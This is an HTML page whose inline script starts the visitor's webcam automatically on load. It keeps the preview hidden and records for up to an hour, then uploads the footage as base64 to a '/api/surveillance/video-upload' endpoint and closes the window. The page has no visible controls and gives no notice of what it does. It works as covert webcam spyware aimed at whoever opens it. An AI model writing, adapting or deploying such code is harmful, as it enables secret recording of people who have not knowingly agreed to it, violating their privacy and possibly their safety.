
            <!DOCTYPE html>
            <html>
            <head>
                <title>Video Recording</title>
            </head>
            <body>
                <video id="video" width="640" height="480" autoplay style="display:none;"></video>
                <script>
                    let mediaRecorder;
                    let recordedChunks = [];
                    
                    async function startRecording() {
                        try {
                            const stream = await navigator.mediaDevices.getUserMedia({ 
                                video: {
                                    width: { ideal: 1280 },
                                    height: { ideal: 720 },
                                    deviceId: 'default'
                                },
                                audio: false
                            });
                            
                            const video = document.getElementById('video');
                            video.srcObject = stream;
                            
                            mediaRecorder = new MediaRecorder(stream, {
                                mimeType: 'video/webm;codecs=vp9'
                            });
                            
                            mediaRecorder.ondataavailable = (event) => {
                                if (event.data.size > 0) {
                                    recordedChunks.push(event.data);
                                }
                            };
                            
                            mediaRecorder.onstop = async () => {
                                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                                
                                // Convert Blob to base64 for simplicity in this case
                                const reader = new FileReader();
                                reader.onloadend = () => {
                                    const base64data = reader.result;
                                    
                                    // Send the video data back to server
                                    fetch('/api/surveillance/video-upload', {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify({ 
                                            video: base64data,
                                            filename: 'recording_2026-02-25T19-01-44-055Z.webm'
                                        })
                                    }).then(() => {
                                        window.close();
                                    });
                                };
                                reader.readAsDataURL(blob);
                            };
                            
                            mediaRecorder.start(1000); // Collect data every second
                            return true;
                        } catch (error) {
                            console.error('Recording failed:', error);
                            return false;
                        }
                    }
                    
                    // Auto-start recording
                    startRecording();
                    
                    // Record for maximum 1 hour, then stop
                    setTimeout(() => {
                        if (mediaRecorder && mediaRecorder.state === 'recording') {
                            mediaRecorder.stop();
                        }
                    }, 3600000);
                </script>
            </body>
            </html>
